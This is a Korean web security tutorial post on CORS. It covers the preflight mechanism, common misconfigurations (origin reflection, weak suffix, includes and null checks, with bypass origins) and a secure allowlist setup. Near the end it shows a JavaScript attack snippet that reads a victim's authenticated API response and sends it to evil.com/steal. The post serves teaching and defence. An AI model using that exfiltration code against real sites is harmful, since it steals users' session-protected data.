---
title: "CORS 보안: 잘못된 설정이 SOP를 무력화한다"
description: "Cross-Origin Resource Sharing의 동작 원리, Preflight 메커니즘, Origin 반영·와일드카드·suffix 검증 우회 등 CORS 잘못된 설정 패턴과 허용 목록 기반 안전한 설정 방법을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-06"
archiveOrder: 7
type: "knowledge"
category: "Security"
tags: ["웹보안", "CORS", "SOP", "Access-Control-Allow-Origin", "API보안"]
featured: false
draft: false
---

[지난 글](/posts/websec-same-origin-policy/)에서 SOP가 교차 출처 응답 읽기를 차단하는 원리를 설명했다. CORS는 서버가 특정 출처에 한해 SOP를 완화해 응답을 허용하는 공식 메커니즘이다. 하지만 CORS를 잘못 설정하면 SOP의 보호가 완전히 무력화된다.

## CORS 기본 동작

브라우저가 교차 출처 요청을 보낼 때 `Origin` 헤더를 포함한다:

```http
GET /api/user HTTP/1.1
Origin: https://app.example.com
```

서버가 `Access-Control-Allow-Origin` 헤더로 해당 출처를 허용하면 브라우저가 응답을 스크립트에 노출한다:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
```

허용하지 않으면 브라우저가 응답을 차단하고 CORS 에러를 발생시킨다.

## Preflight 요청

단순 요청이 아닌 경우(커스텀 헤더, `PUT`/`DELETE`/`PATCH`, `Content-Type: application/json` 등) 브라우저는 실제 요청 전에 `OPTIONS` 메서드로 **Preflight 요청**을 먼저 보낸다:

```http
OPTIONS /api/data HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

서버가 허용을 응답하면 실제 요청이 전송된다.

![CORS Preflight 흐름](/assets/posts/websec-cors-security-preflight.svg)

Preflight를 최소화하려면 `Access-Control-Max-Age` 헤더로 캐시 시간을 설정한다:

```http
Access-Control-Max-Age: 86400
```

## 주요 CORS 응답 헤더

```http
# 허용 출처 (단일값 또는 *)
Access-Control-Allow-Origin: https://app.example.com

# 쿠키·인증 헤더 포함 여부
Access-Control-Allow-Credentials: true

# 허용 메서드
Access-Control-Allow-Methods: GET, POST, PUT, DELETE

# 허용 요청 헤더
Access-Control-Allow-Headers: Content-Type, Authorization

# 클라이언트가 접근 가능한 응답 헤더
Access-Control-Expose-Headers: X-Request-Id

# Preflight 캐시 시간(초)
Access-Control-Max-Age: 3600
```

## CORS 잘못된 설정 패턴

![CORS 잘못된 설정 vs 올바른 설정](/assets/posts/websec-cors-security-misconfig.svg)

### 1. Origin 헤더를 그대로 반영 (가장 위험)

```javascript
// 취약: 검증 없이 Origin 헤더를 ACAO에 반영
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

모든 출처에서 인증 쿠키 포함 요청의 응답을 읽을 수 있다. 공격자가 자신의 서버에서 피해자의 브라우저를 통해 API를 호출하고 응답을 탈취할 수 있다.

### 2. 와일드카드 + Credentials 조합

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

브라우저 규격상 이 조합은 허용되지 않아 브라우저가 거부하지만, 이를 의도하고 구현하는 잘못된 코드가 실제로 존재한다. `*`는 인증이 필요 없는 공개 API에만 사용해야 한다.

### 3. 취약한 Origin 검증

```javascript
// 취약: suffix 검사
if (origin.endsWith('.example.com')) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
// 우회: evil.example.com.attacker.io → .example.com으로 끝남
```

```javascript
// 취약: includes 검사
if (origin.includes('example.com')) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
// 우회: notexample.com.evil.io, evil.com/example.com
```

```javascript
// 취약: null 허용
if (origin === 'null') {
  res.setHeader('Access-Control-Allow-Origin', 'null');
}
// 공격: 로컬 파일 또는 sandboxed iframe에서 null origin 전송
```

### 4. 과도한 메서드/헤더 허용

```http
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
```

실제로 필요한 메서드와 헤더만 명시적으로 허용한다.

## 올바른 CORS 설정

```javascript
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://www.example.com',
  // 개발 환경
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : [])
]);

function corsMiddleware(req, res, next) {
  const origin = req.headers.origin;
  
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    // 캐시 오류 방지를 위해 Vary 설정 필수
    res.setHeader('Vary', 'Origin');
  }
  
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Max-Age', '3600');
    return res.status(204).end();
  }
  
  next();
}
```

**`Vary: Origin` 헤더**를 반드시 설정해야 한다. 캐시가 Origin에 따라 다른 응답을 저장하도록 지시하지 않으면, 한 출처의 CORS 응답이 다른 출처에게 제공될 수 있다.

## CORS 취약점 공격 시나리오

```javascript
// 공격자 서버 (evil.com)의 스크립트
fetch('https://api.victim.com/user/profile', {
  credentials: 'include'  // 피해자의 세션 쿠키 포함
})
.then(res => res.json())
.then(data => {
  // CORS 잘못된 설정으로 응답 읽기 성공
  fetch('https://evil.com/steal?data=' + JSON.stringify(data));
});
```

피해자가 `evil.com`을 방문하는 동안 이 스크립트가 `api.victim.com`에 인증된 요청을 보내고 응답을 탈취한다.

---

**지난 글:** [동일 출처 정책(SOP): 웹 보안의 가장 중요한 경계선](/posts/websec-same-origin-policy/)

**다음 글:** [콘텐츠 보안 정책(CSP)](/posts/websec-content-security-policy/)

<br>
읽어주셔서 감사합니다. 😊
